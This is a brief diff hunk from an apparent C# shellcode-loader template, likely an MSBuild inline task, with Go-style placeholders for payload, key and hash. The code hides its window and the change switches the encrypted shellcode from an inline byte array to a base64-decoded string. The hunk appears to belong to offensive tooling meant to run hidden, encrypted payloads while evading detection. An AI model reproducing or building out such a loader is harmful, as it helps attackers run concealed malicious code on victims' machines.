@@ -21,7 +21,7 @@ public class ClassRunner : Task, ITask
         const int SW_SHOW = 5;
         ShowWindow(handle, SW_HIDE);
 
-        byte[] encShellcode = { {{.Payload}} };
+        byte[] encShellcode = Convert.FromBase64String("{{.Payload}}");
         byte[] rawShellcode = { };
         byte[] key = { {{.Key}} };
         byte[] realHash = { {{.Hash}} };
